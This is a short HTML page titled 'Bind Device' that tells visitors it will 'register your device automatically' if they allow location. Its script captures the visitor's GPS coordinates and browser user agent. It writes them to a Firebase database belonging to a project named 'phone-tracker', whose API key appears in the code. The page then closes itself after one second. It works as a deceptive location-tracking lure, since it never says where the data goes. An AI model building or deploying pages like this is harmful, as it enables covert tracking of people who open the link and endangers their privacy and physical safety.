<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bind Device</title>
</head>
<body>
<h2>Device Registration</h2>
<p>Allow location to register your device automatically. This page will close after registration.</p>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyAz9MekmxZ3n32vzVkjXpQZdWCA-zzUH9o",
  authDomain: "phone-tracker-82286.firebaseapp.com",
  projectId: "phone-tracker-82286",
  storageBucket: "phone-tracker-82286.appspot.com",
  messagingSenderId: "343819739526",
  appId: "1:343819739526:web:10acad845264bd81c18c07"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Automatically register device
navigator.geolocation.getCurrentPosition(async pos => {
  const latitude = pos.coords.latitude;
  const longitude = pos.coords.longitude;
  const deviceName = navigator.userAgent || "Unknown Device";

  try {
    await addDoc(collection(db, "devices"), {
      name: deviceName,
      latitude,
      longitude,
      timestamp: Date.now()
    });
    console.log("Device registered!");
    setTimeout(()=>window.close(), 1000); // Close after 1 second
  } catch(e){
    console.error("Error adding device:", e);
  }
}, err => console.error("Geolocation error:", err));
</script>
</body>
</html>
